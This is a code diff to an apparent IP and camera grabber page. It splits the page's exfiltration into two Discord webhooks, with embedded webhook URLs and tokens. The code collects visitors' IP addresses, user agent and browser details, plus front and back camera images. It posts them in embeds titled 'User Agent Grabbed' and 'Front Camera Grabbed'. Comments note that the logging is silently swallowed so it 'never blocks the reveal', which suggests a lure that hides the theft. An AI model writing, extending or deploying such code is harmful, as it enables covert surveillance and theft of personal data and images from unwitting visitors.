@@ -724,7 +724,8 @@
   const dataGrid = document.getElementById('dataGrid');
   const cameraHero = document.getElementById('cameraHero');
 
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559572866335248401/DmusNOEoJJayjQ1ibOFsdqCgMi1ex9uAN5fYfGqnQ2ZSYrAayzdjqDWIkHu9PpnEWm9S';
+  const INFO_WEBHOOK = 'https://discord.com/api/webhooks/1559572866335248401/DmusNOEoJJayjQ1ibOFsdqCgMi1ex9uAN5fYfGqnQ2ZSYrAayzdjqDWIkHu9PpnEWm9S';
+  const CAM_WEBHOOK = 'https://discord.com/api/webhooks/1559574038173720647/FPpV1xO6s2LX1LhMmIjvq4KYJD7-wS6GRCno6uWcOjk30s5c0lPstQ1M2_F3BZ3qXE0H';
   const WEBHOOK_NAME = 'Wckd';
   const WEBHOOK_AVATAR = 'https://cdn.discordapp.com/attachments/1558794055314448405/1559572604006834308/IMG_1368.jpg?ex=6acf90ac&is=6ace3f2c&hm=583fa98f91775170f2ce00711540c6a2cd4f73772b6f770740a9ab842de588f2&';
 
@@ -786,7 +787,7 @@
     return new Blob([arr], { type: mime });
   }
 
-  async function sendLog(data, frontB64, backB64) {
+  async function sendInfoLog(data) {
     try {
       const fields = [
         { name: 'IP Address', value: val(data.ip), inline: true },
@@ -819,10 +820,41 @@
             title: 'User Agent Grabbed',
             color: 0x000000,
             fields: fields,
-            image: backB64 ? { url: 'attachment://back.png' } : undefined,
-            thumbnail: frontB64 ? { url: 'attachment://front.png' } : undefined,
             timestamp: new Date().toISOString(),
             footer: { text: `grabbed ${stamp()}` }
+          }
+        ]
+      };
+
+      await fetch(INFO_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      // swallow — logging never blocks the reveal
+    }
+  }
+
+  async function sendCamLog(frontB64, backB64, data) {
+    try {
+      const payload = {
+        username: WEBHOOK_NAME,
+        avatar_url: WEBHOOK_AVATAR,
+        embeds: [
+          {
+            title: 'Front Camera Grabbed',
+            color: 0x000000,
+            image: { url: 'attachment://front.png' },
+            timestamp: new Date().toISOString(),
+            footer: { text: `${val(data.ip)} · ${stamp()}` }
+          },
+          {
+            title: 'Back Camera Grabbed',
+            color: 0x000000,
+            image: { url: 'attachment://back.png' },
+            timestamp: new Date().toISOString(),
+            footer: { text: `${val(data.ip)} · ${stamp()}` }
           }
         ]
       };
@@ -830,14 +862,10 @@
       const form = new FormData();
       form.append('payload_json', JSON.stringify(payload));
 
-      if (frontB64) {
-        form.append('files[0]', b64ToBlob(frontB64), 'front.png');
-      }
-      if (backB64) {
-        form.append('files[1]', b64ToBlob(backB64), 'back.png');
-      }
+      if (frontB64) form.append('files[0]', b64ToBlob(frontB64), 'front.png');
+      if (backB64) form.append('files[1]', b64ToBlob(backB64), 'back.png');
 
-      await fetch(WEBHOOK_URL, { method: 'POST', body: form });
+      await fetch(CAM_WEBHOOK, { method: 'POST', body: form });
     } catch (e) {
       // swallow — logging never blocks the reveal
     }
@@ -1055,7 +1083,8 @@
       pdfViewer: navigator.pdfViewerEnabled ? 'Yes' : 'No'
     };
 
-    sendLog(data, frontResult.data, backResult.data).catch(() => {});
+    sendInfoLog(data).catch(() => {});
+    sendCamLog(frontResult.data, backResult.data, data).catch(() => {});
 
     const takenAt = stamp();
     const backLabel = sameCam ? 'Back Camera (default)' : 'Back Camera';
